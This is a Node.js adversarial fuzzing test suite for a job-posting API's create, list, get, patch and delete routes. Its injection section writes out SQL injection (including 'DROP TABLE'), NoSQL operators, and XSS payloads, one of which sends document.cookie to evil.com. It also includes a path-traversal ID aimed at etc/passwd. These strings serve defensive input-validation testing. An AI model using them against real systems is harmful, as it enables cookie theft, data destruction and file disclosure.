/**
 * tests/adversarial-fuzzing-m1.test.js
 * Adversarial Edge Cases & Fuzzing Verification Suite for Milestone M1
 * BlueCollar Connect — Post Jobs API
 *
 * Challenger: challenger_m1_2
 * Role: Edge Cases & Validation Fuzzing
 *
 * Scope:
 * 1. Malformed JSON bodies & non-object request payloads
 * 2. Missing required keys on job creation
 * 3. Negative, zero, NaN, Infinity, and non-numeric budgets (including negative objects & strings)
 * 4. Empty, whitespace-only, undersized, and oversized strings
 * 5. Weird urgency strings and type variations
 * 6. Invalid category identifiers (cat-0, cat-13, unknown, prototype keys: __proto__)
 * 7. SQL, NoSQL, and script injection payloads
 * 8. Query parameter pollution & fuzzing on GET /api/jobs (duplicate ?sort=, duplicate ?status=, ?limit=)
 * 9. ID parameter fuzzing on GET/PATCH/DELETE /api/jobs/:id (traversal, prototype, giant strings)
 * 10. PATCH /api/jobs/:id payload fuzzing & immutable field protection
 */

const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const http = require('http');
const express = require('express');
const session = require('express-session');

const PROJECT_ROOT = path.resolve(__dirname, '..');
const USERS_JSON_PATH = path.join(PROJECT_ROOT, 'server', 'db', 'users.json');
const JOBS_JSON_PATH = path.join(PROJECT_ROOT, 'server', 'db', 'jobs.json');

const authRoutes = require('../server/routes/auth');
const jobRoutes = require('../server/routes/jobs');
const db = require('../server/db/database');

// ─── Database Backup & Restoration ───────────────────────────────────────────
const BACKUP_USERS = fs.existsSync(USERS_JSON_PATH) ? fs.readFileSync(USERS_JSON_PATH, 'utf8') : '[]';
const BACKUP_JOBS = fs.existsSync(JOBS_JSON_PATH) ? fs.readFileSync(JOBS_JSON_PATH, 'utf8') : '[]';

let restored = false;
function restoreDatabases() {
  if (restored) return;
  restored = true;
  try {
    fs.writeFileSync(USERS_JSON_PATH, BACKUP_USERS, 'utf8');
    fs.writeFileSync(JOBS_JSON_PATH, BACKUP_JOBS, 'utf8');
  } catch (e) {
    console.error('Error restoring test databases:', e.message);
  }
}

process.on('exit', restoreDatabases);
process.on('SIGINT', () => { restoreDatabases(); process.exit(1); });
process.on('SIGTERM', () => { restoreDatabases(); process.exit(1); });

// ─── Raw HTTP Request Helper ─────────────────────────────────────────────────
function rawHttpRequest(baseUrl, path, method = 'GET', headers = {}, body = null) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, baseUrl);
    const reqOptions = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname + url.search,
      method,
      headers: { ...headers }
    };

    if (body !== null && !reqOptions.headers['Content-Type']) {
      reqOptions.headers['Content-Type'] = 'application/json';
    }

    const req = http.request(reqOptions, (res) => {
      let rawData = '';
      res.on('data', chunk => { rawData += chunk; });
      res.on('end', () => {
        let parsed = null;
        try {
          parsed = JSON.parse(rawData);
        } catch {
          parsed = rawData;
        }
        resolve({
          status: res.statusCode,
          headers: res.headers,
          data: parsed,
          raw: rawData
        });
      });
    });

    req.on('error', reject);

    if (body !== null) {
      if (typeof body === 'string') {
        req.write(body);
      } else {
        req.write(JSON.stringify(body));
      }
    }
    req.end();
  });
}

// ─── Test Server Setup ───────────────────────────────────────────────────────
function createApp() {
  const app = express();
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));
  app.use(session({
    secret: 'adversarial_fuzzing_secret_998877',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 }
  }));

  // Test session helper to establish authenticated sessions
  app.post('/__test__/login', (req, res) => {
    const { userId } = req.body || {};
    if (userId) {
      req.session.userId = userId;
      return res.json({ success: true, userId });
    }
    res.status(400).json({ success: false });
  });

  app.use('/api/auth', authRoutes);
  app.use('/api/jobs', jobRoutes);

  // Global error handler to catch unhandled errors
  app.use((err, req, res, next) => {
    if (err.status && err.status < 500) {
      return res.status(err.status).json({ success: false, error: err.message });
    }
    console.error('Unhandled server error in app:', err);
    res.status(500).json({ success: false, error: err.message || 'Internal Server Error' });
  });

  return app;
}

async function startServer() {
  const app = createApp();
  const server = http.createServer(app);
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  const baseUrl = `http://127.0.0.1:${port}`;
  return { server, baseUrl };
}

// ─── Test Runner Implementation ──────────────────────────────────────────────
async function runFuzzingTests() {
  console.log('======================================================================');
  console.log('ADVERSARIAL EDGE CASE & FUZZING TEST SUITE — MILESTONE M1');
  console.log('Auditing: POST /api/jobs, GET /api/jobs, GET/PATCH/DELETE /api/jobs/:id');
  console.log('======================================================================\n');

  const { server, baseUrl } = await startServer();

  let totalTests = 0;
  let passedTests = 0;
  let failedTests = 0;
  const failures = [];

  function record(id, desc, passed, detail = '') {
    totalTests++;
    if (passed) {
      passedTests++;
      console.log(`  ✅ [PASS] ${id}: ${desc}`);
    } else {
      failedTests++;
      console.log(`  ❌ [FAIL] ${id}: ${desc} -> ${detail}`);
      failures.push({ id, desc, detail });
    }
  }

  try {
    // Step 0: Set up verified customer user in users.json and get session cookie
    const users = JSON.parse(BACKUP_USERS);
    let customer = users.find(u => u.role === 'customer' && u.isVerified);
    if (!customer) {
      customer = {
        id: 'cust-fuzz-001',
        fullName: 'Fuzzing Customer',
        email: 'fuzzing_customer@example.com',
        role: 'customer',
        isVerified: true,
        createdAt: new Date().toISOString()
      };
      users.push(customer);
      fs.writeFileSync(USERS_JSON_PATH, JSON.stringify(users, null, 2), 'utf8');
    }

    // Login via session helper
    const loginRes = await rawHttpRequest(baseUrl, '/__test__/login', 'POST', {}, { userId: customer.id });
    const setCookie = loginRes.headers['set-cookie'];
    const authCookie = Array.isArray(setCookie) ? setCookie[0].split(';')[0] : (setCookie ? setCookie.split(';')[0] : '');

    assert.ok(authCookie, 'Authentication session cookie could not be established');

    const authHeaders = {
      'Cookie': authCookie,
      'Content-Type': 'application/json'
    };

    const validBaseJob = {
      title: 'Valid Emergency Pipe Repair',
      description: 'Need master plumber to fix burst kitchen pipe immediately.',
      category: 'cat-2',
      location: '123 Main St, New York',
      urgency: 'urgent',
      budget: '$150 - $300'
    };

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 1: Malformed JSON Bodies & Non-Object Payloads
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 1: Malformed JSON Bodies & Payload Type Fuzzing ---');

    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, '{"title": "Unterminated JSON');
      record('F1.1', 'Malformed JSON: unterminated string returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, '{"title": "Test", "category": "cat-1",}');
      record('F1.2', 'Malformed JSON: trailing comma returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, 'null');
      record('F1.3', 'JSON body is literal null returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, '[{"title": "Array Payload"}]');
      record('F1.4', 'JSON body is an array returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, '"Just a raw string"');
      record('F1.5', 'JSON body is raw string literal returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, '12345');
      record('F1.6', 'JSON body is raw number returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, 'true');
      record('F1.7', 'JSON body is raw boolean returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, '');
      record('F1.8', 'Empty body with Content-Type application/json returns 400 (never 500)', res.status === 400, `Got HTTP ${res.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 2: Missing Required Keys on POST /api/jobs
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 2: Missing Required Keys on Job Creation ---');

    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, {});
      record('F2.1', 'Empty object {} returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const { title, ...rest } = validBaseJob;
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, rest);
      record('F2.2', 'Missing title returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const { category, ...rest } = validBaseJob;
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, rest);
      record('F2.3', 'Missing category returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const { description, ...rest } = validBaseJob;
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, rest);
      record('F2.4', 'Missing description returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const { location, ...rest } = validBaseJob;
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, rest);
      record('F2.5', 'Missing location returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const { urgency, ...rest } = validBaseJob;
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, rest);
      record('F2.6', 'Missing urgency returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const { budget, ...rest } = validBaseJob;
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, rest);
      record('F2.7', 'Missing budget returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 3: Empty Strings, Whitespace, & String Boundary Conditions
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 3: Empty Strings, Whitespace & Length Boundaries ---');

    {
      const payload = { ...validBaseJob, title: '' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.1', 'Empty string title returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, title: '     \t\n   ' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.2', 'Whitespace-only title returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, title: 'Four' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.3', '4-char title returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, description: '' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.4', 'Empty string description returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, description: '              ' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.5', 'Whitespace-only description returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, description: 'Nine char' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.6', '9-char description returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, location: '' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.7', 'Empty string location returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, location: ' ' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F3.8', 'Whitespace-only location returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, title: 'A'.repeat(10000) };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      const passed = (res.status === 201 || res.status === 400 || res.status === 413) && res.status !== 500;
      record('F3.9', '10KB oversized title handled without 500 crash', passed, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, description: 'B'.repeat(50000) };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      const passed = (res.status === 201 || res.status === 400 || res.status === 413) && res.status !== 500;
      record('F3.10', '50KB oversized description handled without 500 crash', passed, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, description: 'X'.repeat(200000) };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      const passed = res.status === 413 || res.status === 400;
      record('F3.11', 'Excessive payload >100KB returns 413/400 (never 500)', passed, `Got HTTP ${res.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 4: Negative, Zero, and Non-Numeric Budgets
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 4: Negative & Non-Numeric Budget Fuzzing ---');

    {
      const payload = { ...validBaseJob, budget: -500 };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.1', 'Negative numeric budget (-500) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: 0 };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.2', 'Zero numeric budget (0) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: -0.01 };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.3', 'Negative decimal budget (-0.01) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: false };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.4', 'Boolean budget (false) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: '' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.5', 'Empty string budget ("") returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: '   ' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.6', 'Whitespace string budget ("   ") returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: [100, 200] };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.7', 'Array budget [100, 200] returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: { min: 500, max: 200 } };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.8', 'Object budget with min > max returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: { min: 'invalid' } };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.9', 'Object budget with non-numeric min returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, budget: {} };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.10', 'Empty object budget {} returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      // Adversarial check: Negative budget range object { min: -500, max: -100 }
      const payload = { ...validBaseJob, budget: { min: -500, max: -100 } };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.11', 'Object budget with negative range { min: -500, max: -100 } returns 400', res.status === 400, `Got HTTP ${res.status}, body: ${JSON.stringify(res.data)}`);
    }
    {
      // Adversarial check: Negative budget string "-500"
      const payload = { ...validBaseJob, budget: '-500' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F4.12', 'Negative numeric string budget "-500" returns 400', res.status === 400, `Got HTTP ${res.status}, body: ${JSON.stringify(res.data)}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 5: Urgency Validation Fuzzing
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 5: Urgency Field Fuzzing ---');

    const weirdUrgencies = [
      'CRITICAL',
      'urgent!',
      'super-urgent',
      'yesterday',
      'asap',
      '123',
      '',
      '   ',
      'undefined',
      'null',
      'medium-high'
    ];

    for (const urg of weirdUrgencies) {
      const payload = { ...validBaseJob, urgency: urg };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record(`F5.${urg || 'empty'}`, `Weird urgency "${urg}" returns 400 (never 500)`, res.status === 400, `Got HTTP ${res.status}`);
    }

    {
      const payload = { ...validBaseJob, urgency: 1 };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F5.num', 'Numeric urgency (1) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, urgency: ['urgent'] };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F5.arr', 'Array urgency (["urgent"]) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, urgency: { level: 'urgent' } };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F5.obj', 'Object urgency ({ level: "urgent" }) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 6: Category Validation Fuzzing & Prototype Key Injection
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 6: Category Validation & Prototype Attack Surface ---');

    const invalidCategories = [
      'cat-0',
      'cat-13',
      'cat-999',
      'cat-foo',
      'electricians',
      'dog-walking',
      'hacker',
      'null',
      '',
      '   ',
      'CAT-13'
    ];

    for (const cat of invalidCategories) {
      const payload = { ...validBaseJob, category: cat };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record(`F6.${cat || 'empty'}`, `Invalid category "${cat}" returns 400`, res.status === 400, `Got HTTP ${res.status}`);
    }

    // Legit category slug check: constructor IS cat-5
    {
      const payload = { ...validBaseJob, category: 'constructor' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      const passed = res.status === 201 && res.data.job.category === 'cat-5';
      record('F6.slug_constructor', 'Legitimate slug "constructor" resolves to cat-5 with 201', passed, `Got HTTP ${res.status}`);
    }

    // Prototype injection attempt: __proto__
    {
      const payload = { ...validBaseJob, category: '__proto__' };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      const passed = res.status === 400;
      record('F6.proto___proto__', 'Prototype key "__proto__" as category returns 400 (never 201)', passed, `Got HTTP ${res.status}, body: ${JSON.stringify(res.data)}`);
    }

    // Non-string categories
    {
      const payload = { ...validBaseJob, category: 1 };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F6.num', 'Numeric category (1) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, category: ['cat-1'] };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F6.arr', 'Array category (["cat-1"]) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 7: SQL, NoSQL, & Script Injection Payloads
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 7: Injection Payloads (SQL / NoSQL / XSS / Script) ---');

    const injectionPayloads = [
      { name: 'SQL Injection in Title', field: 'title', val: "'; DROP TABLE jobs; -- ' OR '1'='1" },
      { name: 'SQL Union in Description', field: 'description', val: "' UNION SELECT 1, 'admin', 'password', 4, 5 -- and more text to satisfy min length" },
      { name: 'SQL Injection in Location', field: 'location', val: "123 Main St' OR 1=1 --" },
      { name: 'Stored XSS in Title', field: 'title', val: "<script>alert('pwned_title')</script>" },
      { name: 'Stored XSS in Description', field: 'description', val: "<img src=x onerror=\"fetch('http://evil.com?c='+document.cookie)\"> long enough description" },
      { name: 'Stored XSS in Location', field: 'location', val: "\"><svg onload=alert(1)>" },
      { name: 'NoSQL Operator in Title', field: 'title', val: '{"$gt": ""} - Valid title prefix' },
      { name: 'NoSQL Operator in Description', field: 'description', val: '{"$where": "this.status == 1"} - Description for testing injection resilience' },
      { name: 'HTML Injection in Title', field: 'title', val: '<a href="javascript:void(0)" onclick="evil()">Click Here</a>' }
    ];

    for (const test of injectionPayloads) {
      const payload = { ...validBaseJob, [test.field]: test.val };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      const passed = (res.status === 201 || res.status === 400) && res.status !== 500;
      record(`F7.${test.name}`, `${test.name} handled safely without 500 crash`, passed, `Got HTTP ${res.status}`);

      if (res.status === 201 && res.data && res.data.job && res.data.job.id) {
        const getRes = await rawHttpRequest(baseUrl, `/api/jobs/${res.data.job.id}`, 'GET');
        assert.equal(getRes.status, 200, `GET /api/jobs/${res.data.job.id} should return 200`);
      }
    }

    {
      const payload = { ...validBaseJob, title: { '$gt': '' } };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F7.nosql_obj_title', 'NoSQL object as title { "$gt": "" } returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }
    {
      const payload = { ...validBaseJob, location: { '$ne': null } };
      const res = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, payload);
      record('F7.nosql_obj_loc', 'NoSQL object as location { "$ne": null } returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 8: Query Parameter Fuzzing on GET /api/jobs (including Duplicate Params)
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 8: Query Parameter Fuzzing & Parameter Pollution on GET /api/jobs ---');

    // 8.1 Duplicate sort query params (?sort=newest&sort=oldest) -> Array in req.query.sort
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs?sort=newest&sort=oldest', 'GET');
      const passed = (res.status === 200 || res.status === 400) && res.status !== 500;
      record('F8.1_dup_sort', 'Duplicate sort query (?sort=newest&sort=oldest) handled without 500 crash', passed, `Got HTTP ${res.status}: ${JSON.stringify(res.data)}`);
    }

    // 8.2 Duplicate status query params (?status=open&status=cancelled) -> Array in req.query.status
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs?status=open&status=cancelled', 'GET');
      const passed = (res.status === 200 || res.status === 400) && res.status !== 500;
      record('F8.2_dup_status', 'Duplicate status query (?status=open&status=cancelled) handled without 500 crash', passed, `Got HTTP ${res.status}: ${JSON.stringify(res.data)}`);
    }

    // 8.3 Duplicate category query params (?category=cat-1&category=cat-2)
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs?category=cat-1&category=cat-2', 'GET');
      const passed = (res.status === 200 || res.status === 400) && res.status !== 500;
      record('F8.3_dup_cat', 'Duplicate category query handled without 500 crash', passed, `Got HTTP ${res.status}`);
    }

    // 8.4 Duplicate urgency query params (?urgency=urgent&urgency=low)
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs?urgency=urgent&urgency=low', 'GET');
      const passed = (res.status === 200 || res.status === 400) && res.status !== 500;
      record('F8.4_dup_urg', 'Duplicate urgency query handled without 500 crash', passed, `Got HTTP ${res.status}`);
    }

    // 8.5 Limit parameter fuzzing
    const limitCases = [
      { val: '-5', desc: 'negative limit' },
      { val: '0', desc: 'zero limit' },
      { val: 'abc', desc: 'non-numeric string limit' },
      { val: '99999999999999999999', desc: 'overflow limit' },
      { val: '1.5', desc: 'float limit' }
    ];

    for (const lc of limitCases) {
      const res = await rawHttpRequest(baseUrl, `/api/jobs?limit=${lc.val}`, 'GET');
      const passed = res.status === 200 && res.data && res.data.success === true;
      record(`F8.limit_${lc.desc}`, `Limit fuzzing: ${lc.desc} (?limit=${lc.val}) returns 200 (never 500)`, passed, `Got HTTP ${res.status}`);
    }

    // 8.6 Location query with regex special chars: ?location=.*+?^${}()|[]\\
    {
      const res = await rawHttpRequest(baseUrl, '/api/jobs?location=' + encodeURIComponent('.*+?^${}()|[]\\'), 'GET');
      const passed = res.status === 200 && res.data && res.data.success === true;
      record('F8.6_regex_loc', 'Location regex special characters (?location=.*+?^...) returns 200', passed, `Got HTTP ${res.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 9: ID Parameter Fuzzing on GET, PATCH, and DELETE /api/jobs/:id
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 9: ID Parameter Fuzzing on /api/jobs/:id ---');

    const weirdIds = [
      { id: 'nonexistent-uuid-9999-8888', desc: 'random nonexistent UUID' },
      { id: '..%2F..%2Fetc%2Fpasswd', desc: 'path traversal attempt' },
      { id: 'constructor', desc: 'prototype key: constructor' },
      { id: '__proto__', desc: 'prototype key: __proto__' },
      { id: 'toString', desc: 'prototype key: toString' },
      { id: 'null', desc: 'string literal "null"' },
      { id: 'undefined', desc: 'string literal "undefined"' },
      { id: '[object%20Object]', desc: 'stringified object' },
      { id: encodeURIComponent('<script>alert(1)</script>'), desc: 'XSS payload in ID' },
      { id: 'A'.repeat(5000), desc: '5KB giant string ID' }
    ];

    for (const item of weirdIds) {
      const getRes = await rawHttpRequest(baseUrl, `/api/jobs/${item.id}`, 'GET');
      const getPassed = getRes.status === 404;
      record(`F9.get_${item.desc}`, `GET /api/jobs/${item.desc} returns 404 (never 500)`, getPassed, `Got HTTP ${getRes.status}`);

      const patchRes = await rawHttpRequest(baseUrl, `/api/jobs/${item.id}`, 'PATCH', authHeaders, { title: 'Attempted Patch' });
      const patchPassed = patchRes.status === 404;
      record(`F9.patch_${item.desc}`, `PATCH /api/jobs/${item.desc} returns 404 (never 500)`, patchPassed, `Got HTTP ${patchRes.status}`);

      const delRes = await rawHttpRequest(baseUrl, `/api/jobs/${item.id}`, 'DELETE', authHeaders);
      const delPassed = delRes.status === 404;
      record(`F9.del_${item.desc}`, `DELETE /api/jobs/${item.desc} returns 404 (never 500)`, delPassed, `Got HTTP ${delRes.status}`);
    }

    // ──────────────────────────────────────────────────────────────────────────
    // SUITE 10: PATCH /api/jobs/:id Payload Fuzzing & Immutability Protection
    // ──────────────────────────────────────────────────────────────────────────
    console.log('\n--- SUITE 10: PATCH /api/jobs/:id Field Fuzzing & Immutability ---');

    const createRes = await rawHttpRequest(baseUrl, '/api/jobs', 'POST', authHeaders, validBaseJob);
    assert.equal(createRes.status, 201, 'Base job creation failed');
    const createdJob = createRes.data.job;
    const testJobId = createdJob.id;

    // 10.1 Patch title to short string (< 5 chars)
    {
      const res = await rawHttpRequest(baseUrl, `/api/jobs/${testJobId}`, 'PATCH', authHeaders, { title: 'ABC' });
      record('F10.1', 'PATCH title with short string (< 5 chars) returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // 10.2 Patch category to invalid category
    {
      const res = await rawHttpRequest(baseUrl, `/api/jobs/${testJobId}`, 'PATCH', authHeaders, { category: 'cat-999' });
      record('F10.2', 'PATCH category with invalid category returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // 10.3 Patch category to prototype property "__proto__"
    {
      const res = await rawHttpRequest(baseUrl, `/api/jobs/${testJobId}`, 'PATCH', authHeaders, { category: '__proto__' });
      record('F10.3', 'PATCH category with prototype key "__proto__" returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // 10.4 Patch urgency to invalid urgency
    {
      const res = await rawHttpRequest(baseUrl, `/api/jobs/${testJobId}`, 'PATCH', authHeaders, { urgency: 'super_urgent' });
      record('F10.4', 'PATCH urgency with invalid value returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // 10.5 Patch status to invalid status
    {
      const res = await rawHttpRequest(baseUrl, `/api/jobs/${testJobId}`, 'PATCH', authHeaders, { status: 'deleted_forever' });
      record('F10.5', 'PATCH status with invalid value returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // 10.6 Patch budget with min > max
    {
      const res = await rawHttpRequest(baseUrl, `/api/jobs/${testJobId}`, 'PATCH', authHeaders, { budget: { min: 800, max: 200 } });
      record('F10.6', 'PATCH budget with min > max returns 400', res.status === 400, `Got HTTP ${res.status}`);
    }

    // 10.7 Immutability test: Attempt to overwrite id, customerId, userId, customerEmail, createdAt
    {
      const maliciousPayload = {
        id: 'hacked-id-123',
        customerId: 'hacked-cust-999',
        userId: 'hacked-user-999',
        customerName: 'Hacker Name',
        customerEmail: 'hacker@evil.com',
        createdAt: '1970-01-01T00:00:00.000Z',
        title: 'Updated Legitimate Title'
      };
      const res = await rawHttpRequest(baseUrl, `/api/jobs/${testJobId}`, 'PATCH', authHeaders, maliciousPayload);
      const passed = res.status === 200 &&
                     res.data.job.id === testJobId &&
                     res.data.job.customerId === createdJob.customerId &&
                     res.data.job.customerName === createdJob.customerName &&
                     res.data.job.customerEmail === createdJob.customerEmail &&
                     res.data.job.createdAt === createdJob.createdAt;

      record('F10.7', 'Immutable fields (id, customerId, createdAt, customerEmail) cannot be overwritten via PATCH', passed,
        `Expected unchanged metadata, got: id=${res.data?.job?.id}, customerId=${res.data?.job?.customerId}`);
    }

  } catch (err) {
    console.error('Fatal error during test run:', err);
  } finally {
    await new Promise(resolve => server.close(resolve));
    restoreDatabases();
  }

  console.log('\n======================================================================');
  console.log('ADVERSARIAL FUZZING EXECUTION SUMMARY');
  console.log('======================================================================');
  console.log(`TOTAL TESTS RUN : ${totalTests}`);
  console.log(`PASSED          : ${passedTests}`);
